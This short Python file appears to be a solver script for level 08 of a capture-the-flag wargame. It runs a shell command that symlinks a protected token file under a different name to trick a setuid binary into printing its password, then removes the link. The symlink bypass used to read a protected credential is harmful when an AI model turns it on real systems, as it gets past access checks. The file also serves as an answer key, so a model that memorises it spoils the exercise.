"""LEVEL 08"""

from utils.level_wrapper import level_handler


@level_handler
def solve_level08(_, snow_crash):
    """Trick executable with a link"""

    password = snow_crash[
        "ln -s $(pwd)/token /tmp/password; \
         ./level08 /tmp/password; \
         rm -f /tmp/password"
    ]
    return "flag", password.decode()
